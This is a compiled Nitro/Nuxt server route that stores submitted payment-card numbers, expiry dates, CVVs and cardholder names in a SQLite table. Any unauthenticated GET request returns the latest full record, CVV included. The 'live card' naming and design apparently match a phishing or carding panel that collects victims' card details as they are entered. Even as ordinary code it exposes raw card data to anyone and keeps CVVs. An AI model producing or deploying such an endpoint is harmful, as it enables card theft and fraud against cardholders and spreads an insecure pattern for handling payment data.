import { d as defineEventHandler, r as readBody } from '../../../_/nitro.mjs';
import Database from 'better-sqlite3';
import { join } from 'path';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';
import 'node:url';

const dbPath = join(process.cwd(), "database.sqlite");
const db = new Database(dbPath);
const liveCard = defineEventHandler(async (event) => {
  if (event.method === "POST") {
    try {
      const body = await readBody(event);
      const { cardNumber, expiry, cvv, cardholderName, method } = body;
      const result = db.prepare(
        `
                INSERT OR REPLACE INTO live_card_info (
                    card_number,
                    expiry,
                    cvv,
                    cardholder_name,
                    method,
                    created_at
                ) VALUES (?, ?, ?, ?, ?, ?)
            `
      ).run(cardNumber, expiry, cvv, cardholderName, method, (/* @__PURE__ */ new Date()).toISOString());
      return {
        success: true,
        message: "Card info updated",
        id: result.changes
      };
    } catch (error) {
      console.error("Error saving live card info:", error);
      return {
        success: false,
        error: "Failed to save card info"
      };
    }
  } else if (event.method === "GET") {
    try {
      const result = db.prepare(
        `
                SELECT * FROM live_card_info
                ORDER BY created_at DESC
                LIMIT 1
            `
      ).get();
      return {
        success: true,
        data: result || null
      };
    } catch (error) {
      console.error("Error getting live card info:", error);
      return {
        success: false,
        error: "Failed to get card info"
      };
    }
  }
});

export { liveCard as default };
//# sourceMappingURL=live-card.mjs.map
